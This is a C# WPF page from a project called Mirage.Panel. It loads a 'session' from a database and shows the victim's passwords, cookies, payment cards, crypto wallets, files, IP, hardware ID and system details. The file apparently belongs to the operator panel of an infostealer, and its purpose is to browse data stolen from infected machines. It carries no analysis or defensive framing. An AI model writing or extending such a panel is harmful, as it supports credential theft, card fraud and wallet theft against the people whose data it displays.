using System.Windows.Controls;
using Microsoft.EntityFrameworkCore;
using Mirage.Panel.Data;
using Mirage.Panel.Models;

namespace Mirage.Panel.Views;

public partial class SessionDetailPage : Page
{
    private readonly string _sessionId;

    public SessionDetailPage(string sessionId)
    {
        InitializeComponent();
        _sessionId = sessionId;
        LoadSession();
    }

    private void LoadSession()
    {
        var factory = ((App)App.Current).Services.GetService(typeof(IDbContextFactory<AppDbContext>))
            as IDbContextFactory<AppDbContext>;
        if (factory == null) return;

        using var db = factory.CreateDbContext();
        var session = db.Sessions
            .Include(s => s.Passwords)
            .Include(s => s.Cookies)
            .Include(s => s.Cards)
            .Include(s => s.Wallets)
            .Include(s => s.Files)
            .Include(s => s.SystemInfo)
            .FirstOrDefault(s => s.Id == _sessionId);

        if (session == null)
        {
            HeaderText.Text = "Session not found";
            return;
        }

        HeaderText.Text = $"Session — {session.Ip ?? "Unknown IP"}";

        SessionHwid.Text = $"HWID: {session.Hwid ?? "N/A"}";
        SessionIp.Text = $"IP: {session.Ip ?? "N/A"}";
        SessionOs.Text = $"OS: {session.Os ?? "N/A"}";
        SessionUser.Text = $"User: {session.Username ?? "N/A"}";
        SessionCountry.Text = session.CountryCode != null ? $"Country: {session.CountryCode}" : "";

        PasswordsGrid.ItemsSource = session.Passwords.ToList();
        CookiesGrid.ItemsSource = session.Cookies.ToList();
        CardsGrid.ItemsSource = session.Cards.ToList();
        WalletsGrid.ItemsSource = session.Wallets.ToList();
        FilesGrid.ItemsSource = session.Files.ToList();

        if (session.SystemInfo != null)
        {
            SysCpu.Text = session.SystemInfo.Cpu ?? "N/A";
            SysGpu.Text = session.SystemInfo.Gpu ?? "N/A";
            SysRam.Text = session.SystemInfo.Ram ?? "N/A";
            SysOs.Text = session.SystemInfo.Os ?? "N/A";
            SysScreen.Text = session.SystemInfo.Screen ?? "N/A";
            SysHostname.Text = session.SystemInfo.Hostname ?? "N/A";
            SysLocalIp.Text = session.SystemInfo.LocalIp ?? "N/A";
            SysMac.Text = session.SystemInfo.Mac ?? "N/A";
        }
    }

    private void BackClick(object sender, System.Windows.RoutedEventArgs e)
    {
        NavigationService?.GoBack();
    }
}
